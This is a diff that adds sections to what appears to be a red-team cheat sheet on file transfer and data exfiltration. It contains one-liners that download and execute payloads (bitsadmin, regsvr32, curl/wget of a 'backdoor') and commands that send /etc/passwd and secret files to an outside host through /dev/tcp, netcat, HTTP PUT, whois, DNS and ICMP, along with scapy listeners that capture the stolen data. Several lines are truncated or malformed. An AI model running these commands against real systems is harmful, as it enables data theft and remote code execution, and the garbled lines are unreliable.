@@ -56,6 +56,9 @@ ftp -v -n -s:ftp.txt
 
 
 SMB/SAMBA
+HOST
+	(LIN)
+impacket-smbserver share `pwd`
 sudo apt-get install samba
 groupadd smb
 useradd -g smb -d /dev/null -s /etc smber
@@ -66,3 +69,121 @@ smbpasswd -a username
 	path = /etc/www
 	read only = yes
 	browsable = yes
+	(WIN)
+CLIENT
+	(LIN)
+	
+	(WIN)
+copy \\IP\ShareName\file.exe file.exe
+net use x: \\IP\ShareName && copy file.txt x: && net use x: /delete
+
+
+HTTP:
+HOSTING
+python -m SimpleHTTPServer 1337
+python3 -m http.server 1337
+php -S 0.0.0.0:1337
+ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd
+ruby -run -e httpd . -p 1337
+busybox httpd -f -p 8000
+RETRIEVING
+bitsadmin /transfer n http://1.2.3.4/5.exe c:\download\a.exe && c:\download\a.exe
+regsvr32 / u / s /i:http://1.2.3.4/5.exe scrobj.dll
+curl http://1.2.3.4/backdoor
+wget http://1.2.3.4/backdoor
+awk 'BEGIN {
+	RS = ORS = "\r\n"
+	HTTPCon = "/inet/tcp/0/127.0.0.1/1337"
+	print "GET /secret.txt HTTP/1.1\r\nConnection: close\r\n" |& HTTPCon
+	while (HTTPCon |& getline > 0)
+		print $0
+	close(HTTPCon)
+}'
+FILE UPLOAD (HOST)
+nc -lvnp 8000 > secret.txt
+FILE UPLOAD (CLIENT)
+cat secret.txt > /dev/tcp/192.168.1.111/8000
+FILE UPLOAD [PUT(HOST)]
+Nginx HTTP PUT server
+mkdir -p /var/www/upload/
+chown www-data:www-data /var/www/upload/
+cd /etc/nginx/sites-available
+cat <<EOF > file_upload
+server {
+	listen 8000 default_server;
+	server_name httput;
+	location / {
+		root / var / www / upload;
+		dav_methods PUT;
+	}
+}
+EOF
+Cd ../sites-enabled
+Ln -s /etc/nginx/sites-available/file_upload file_upload
+Systemctl start nginx
+FILE UPLOAD [PUT(CLIENT)]
+curl --upload-file secret.txt http://192.168.1.111:8000/
+wget --method=PUT --post-file=secret.txt http://192.168.1.111:8000/
+powershell>>$body = Get-Content secret.txt
+powershell>>Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body
+
+
+WHOIS (DNS)
+HOST
+nc -vlnp 53 | sed "s/ //g" | base64 -d
+CLIENT
+whois -h 192.168.1.111 -p 53 `cat /etc/passwd | base64`
+
+DIG (DNS)
+HOST
+echo <<EOF > dns_exfil.py
+try:
+	from scapy.all import *
+except:
+	print("Scapy not found, please install scapy: pip install scapy")
+def process_packet(pkt):
+	if pkt.haslayer(DNS):
+	domain = pkt[DNS][DNSQR].qname.decode('utf-8')
+		root_domain = domain.split('.')[1]
+		if root_domain.startswith('gooogle'):
+			print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=Tru
+sniff(iface="eth0", prn=process_packet)
+EOF
+python3 dns_exfil.py
+CLIENT
+xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1
+
+PING (ICMP)
+HOST
+cat <<EOF > ping_exfil.py
+import sys
+try:
+	from scapy.all import *
+except:
+	print("Scapy not found, please install scapy: pip install scapy")
+	sys.exit(0)
+def process_packet(pkt):
+	if pkt.haslayer(ICMP):
+		if pkt[ICMP].type == 8:
+			data = pkt[ICMP].load[-4:]
+			print(f'{data.decode("utf-8")}', flush=True, end="", sep="")
+sniff(iface="eth0", prn=process_packet)
+EOF
+python3 ping_exfil.py
+CLIENT
+xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
+
+NETCAT
+HOST
+nc -lvp 8000 > 1.txt
+CLIENT
+nc 192.168.1.111 8000 < 1.txt
+cat < /dev/tcp/192.168.1.111/8000 > file.txt
+
+OPENSSL/NCAT
+HOST
+ncat -ssl -lvp 443 > file.txt
+openssl s_server -accept 443 -www > file.txt
+CLIENT
+openssl s_client -connect 192.168.1.111 -port 443 < file.txt
+ncat -ssl 192.168.1.111 443 < file.txt
